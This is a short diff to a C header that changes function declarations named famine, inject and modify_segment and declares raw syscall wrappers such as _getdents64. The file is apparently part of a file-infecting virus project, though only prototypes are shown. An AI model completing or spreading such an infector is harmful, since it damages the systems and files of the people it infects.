@@ -20,9 +20,6 @@
 /// LOGGER 
 ////////////////////////////////////////////////////////////////////////////////
 
-#define FUNC printf("\033[0;34m;%s()\033[0m\n\n", __PRETTY_FUNCTION__)
-#define ERR printf("\033[0;31m;%s()\033[0m\n\n", __PRETTY_FUNCTION__)
-
 ////////////////////////////////////////////////////////////////////////////////
 /// DEFINES
 ////////////////////////////////////////////////////////////////////////////////
@@ -84,15 +81,16 @@ struct criteria
 ////////////////////////////////////////////////////////////////////////////////
 
 // FAMINE
-__attribute__((hot)) void famine(const char *file, const size_t m_entry);
-void inject(const struct s_info *info, const size_t m_entry);
+__attribute__((hot)) void famine(const char *file, const size_t m_entry, const int trace);
 void modify_segment(struct s_info *info);
+void inject(const struct s_info *info, const size_t m_entry, const int trace);
 
 // INFO
 struct s_info get_info(const char *str);
 void release_info(struct s_info *info);
 
 // LIB
+void Exit(int status);
 int _getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
 int _close(int fd);
 int _open(const char *pathname, int flags, long mode);
